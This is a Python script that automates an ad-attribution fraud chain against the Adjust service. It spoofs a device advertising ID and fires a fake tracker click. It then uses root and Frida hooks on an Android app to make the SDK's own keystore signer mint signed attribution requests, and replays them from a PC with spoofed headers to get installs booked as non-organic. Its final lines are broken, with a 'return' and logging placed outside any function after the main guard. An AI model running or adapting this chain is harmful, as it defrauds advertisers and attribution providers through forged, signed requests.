# win_mint.py - THE decisive test (slice 97 §5): full chain
#   1) farm: fresh GAID -> GMS (readback-verified) + marker tracker click
#   2) attach pre-guard -> relaunch app -> install burst -> in-hook piggy mint
#      (SDK's own Signer.sign = real keystore H) over the app's map with
#      activity_kind=attribution + fresh stamps (proven in minted4 run)
#   3) read the DEVICE verdict (the booked truth)
#   4) send the minted blob from PC with a matching query -> verdict
#   PC non-organic == device non-organic  =>  FULL CHAIN CLOSED.
import base64
import json
import os
import subprocess
import sys
import threading
import time
import urllib.parse
import uuid

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import farm_win as fw
import frida
import sig_probe as sp
import device_funnel as df
import adj9_full_chain as fc

AGJS = os.path.join(HERE, "agent", "adj9agent.js")
OUT = os.path.join(HERE, "win_mint_result.json")
MINT = os.path.join(HERE, "minted97.json")
CREATIVE = "cline_m97"
GPS = str(uuid.uuid4())

ev = {"piggy": None}
PIGGY, READY = threading.Event(), threading.Event()


def on_msg(m, data):
    if m.get("type") != "send":
        return
    p = m.get("payload", {})
    t = p.get("type")
    if t == "piggy":
        ev["piggy"] = p.get("result")
        PIGGY.set()
        print("[piggy]", str(p.get("result"))[:220], flush=True)
    elif t == "nSign":
        print("[nSign %s B]" % p.get("outLen"), flush=True)
    elif t == "sigmap":
        print("[sigmap] act=%d" % len(p.get("activity") or {}), flush=True)
    else:
        if t == "ready":
            READY.set()
        print("[ev]", str(p)[:140], flush=True)


def sh(cmd):
    return subprocess.run(["adb", "shell", cmd], capture_output=True,
                          text=True, timeout=30).stdout


LOG = []


def say(s):
    print(s, flush=True)
    LOG.append(s)

def main():
    # ---- phase 1: farm (proven farm_win recipe, single fresh variant) ----
    say("[1] fresh GAID %s -> GMS" % GPS)
    got = fw.set_gaid(GPS)
    say("    readback: %s" % got)
    if got != GPS:
        say("    !! GAID readback mismatch - aborting (farm lesson)")
        json.dump({"error": "gaid readback", "gps": GPS}, open(OUT, "w"), indent=1)
        return
    code, ref, hops, url = fw.fire_click(GPS, CREATIVE, None)
    say("[1] click http=%s reftag=%s" % (code, (ref or "").split("&")[0]))
    # ---- phase 2: frida pre-guard attach, then relaunch ----
    fw.su("am force-stop %s" % fw.APP)
    time.sleep(1)
    fw.su("rm -f %s %s" % (fw.STATE, fw.ATTR))
    subprocess.run(["adb", "shell", "/debug_ramdisk/su -c "
                    "'pkill -9 frs64; pkill -9 fs17root'"], capture_output=True)
    time.sleep(1)
    subprocess.Popen(["adb", "shell", "/debug_ramdisk/su -c "
                      "'exec /data/local/tmp/fs17root'"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)
    subprocess.run(["adb", "forward", "tcp:27042", "tcp:27042"],
                   capture_output=True)
    rdev = frida.get_device_manager().add_remote_device("127.0.0.1:27042")
    sh("am start -n %s/.ui.main.MainActivity" % fw.APP)
    pid = 0
    for _ in range(30):
        pid = int(sh("pidof %s" % fw.APP).strip() or 0)
        if pid:
            break
        time.sleep(0.3)
    say("[2] attach pid %s" % pid)
    sess = None
    for _ in range(8):
        try:
            sess = rdev.attach(pid)
            break
        except Exception as e:
            say("    attach retry: %s" % str(e)[:80])
            time.sleep(0.7)
    if sess is None:
        say("[F] attach failed")
        json.dump({"error": "attach", "gps": GPS}, open(OUT, "w"), indent=1)
        return
    scr = sess.create_script(open(AGJS, "r", encoding="utf-8").read())
    scr.on("message", on_msg)
    scr.load()
    for _ in range(40):
        if READY.is_set():
            break
        time.sleep(0.5)
    say("[2] ready, waiting for install-burst signing (piggy fires in-hook)")
    t0 = time.time()
    while not PIGGY.is_set() and time.time() - t0 < 90:
        time.sleep(1)
    if not PIGGY.is_set():
        say("[F] no piggy mint")
        sess.detach()
        json.dump({"error": "no piggy", "gps": GPS}, open(OUT, "w"), indent=1)
        return
    out = ev["piggy"]
    auth = out.get("auth") or ""
    b64s = (auth.split('signature="')[1].split('"')[0]
            if 'signature="' in auth else out.get("blobB64"))
    blob = base64.b64decode(b64s) if b64s else None
    json.dump({"authorization": auth, "blob_hex": blob.hex() if blob else None,
               "stamp": out.get("stamp"), "mapPairs": out.get("mapPairs"),
               "gps": GPS, "creative": CREATIVE}, open(MINT, "w"), indent=1)
    # ---- phase 3: device verdict (the booked truth) ----
    say("[3] waiting for the device's own attribution answer...")
    a = {}
    for k in range(6):
        time.sleep(12 if k == 0 else 10)
        a, _app_ref = fw.read_verdict()
        if a:
            break
    say("[3] device verdict: token=%s network=%s creative=%s"
        % ((a or {}).get("tracker_token"), (a or {}).get("network"),
           (a or {}).get("creative")))
    # ---- phase 4: PC send of the minted blob ----
    df.install_proxy("http://127.0.0.1:8888")
    os.environ["ADJ_INSECURE"] = "1"
    pairs = out.get("mapPairs") or []
    val = {}
    for k, v in pairs:
        val.setdefault(k, v)
    gps_m = val.get("gps_adid")
    auid = val.get("android_uuid")
    say("[4] minted-map identity: gps=%s auid=%s (fresh GAID was %s)"
        % (gps_m, auid, GPS))
    q = {k: v for k, v in val.items() if k in (
        "gps_adid", "android_uuid", "gps_adid_src", "gps_adid_attempt",
        "api_level", "app_version", "app_token", "os_name", "os_version",
        "device_name", "device_type", "environment", "package_name",
        "created_at", "sent_at", "installed_at", "updated_at",
        "session_count", "tracking_enabled", "needs_response_details",
        "attribution_deeplink", "offline_mode_enabled",
        "device_manufacturer", "hardware_name", "os_build", "language",
        "cpu_type", "display_width", "display_height", "screen_size",
        "screen_format", "screen_density", "connectivity_type", "ui_mode",
        "foreground", "initiating_package_name", "store_name_from_system")}
    q["initiated_by"] = "backend"
    urlq = "https://app.adjust.com/attribution?" + urllib.parse.urlencode(q)
    import http.client
    pr = urllib.parse.urlsplit(urlq)
    conn = http.client.HTTPSConnection(pr.hostname, 443, timeout=30)
    conn.putrequest("GET", pr.path + "?" + pr.query, skip_host=1,
                    skip_accept_encoding=1)
    conn.putheader("Client-SDK", "android5.7.0")
    conn.putheader("Authorization", auth)
    conn.putheader("User-Agent", fc.MOTO_UA)
    conn.putheader("Host", pr.hostname)
    conn.putheader("Connection", "Keep-Alive")
    conn.putheader("Accept-Encoding", "gzip")
    conn.endheaders()
    r = conn.getresponse()
    body = r.read().decode("utf-8", "replace")
    conn.close()
    v = sp.verdict(r.status, body)
    say("[4] PC send of MINTED blob -> %s %s" % (r.status, v))
    a2, _ = fw.read_verdict()
    say("[3b] device verdict after PC send: network=%s"
        % (a2 or {}).get("network"))
    win = ((a2 or a or {}).get("network") not in (None, "Organic")
           and "Organic" not in (v or ""))
    res = {"gps": GPS, "minted_map_gps": gps_m, "auid": auid,
           "creative": CREATIVE, "click_http": code, "device_verdict": a,
           "pc_send": {"http": r.status, "verdict": v},
           "device_verdict_after": a2, "FULL_CHAIN_NON_ORGANIC": bool(win)}
    json.dump(res, open(OUT, "w"), indent=1)
    say("[+] %s  saved %s" %
        ("FULL CHAIN NON-ORGANIC" if win else "chain result recorded", OUT))
    sess.detach()


if __name__ == "__main__":
    main()

    say("[2] minted %s B -> minted97.json" % (len(blob) if blob else 0))
    return sess, out, code
